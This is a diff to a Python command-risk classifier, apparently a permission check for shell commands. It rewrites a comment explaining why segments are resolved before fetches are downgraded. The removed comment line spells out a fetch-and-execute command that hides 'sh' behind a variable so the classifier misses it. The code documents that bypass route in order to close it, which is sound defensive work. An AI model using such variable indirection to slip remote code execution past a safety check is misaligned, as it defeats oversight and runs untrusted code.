@@ -3722,10 +3722,10 @@ def classify_action(operation: str, extra_protected: tuple[str, ...] = (),
         # MERGE (SEC-A round 2 x B4-9): the post-pass is handed the RESOLVED
         # segments, never the raw ones. It decides by segment TEXT
         # (`_consumes_stdin_dangerously` matches an executor at the head),
-        # so `P=sh; curl -s https://example.com/a | $P` would show that check
-        # a bare `$P`, fail to recognise the executor, and clear the fetch
-        # ask - a laundering path built by handing this function the list
-        # the verdicts did NOT come from.
+        # so a line that assigns `P=sh` and then pipes a literal-URL fetch
+        # into `$P` would show that check a bare `$P`, fail to recognise the
+        # executor, and clear the fetch ask - a laundering path built by
+        # handing this function the list the verdicts did NOT come from.
         verdicts = _downgrade_harmless_fetches(resolved_segments, verdicts)
         worst = max(verdicts, key=lambda v: (v["protected"], v["tier"]))
         worst["impact"] = sorted({item for v in verdicts for item in v["impact"]})
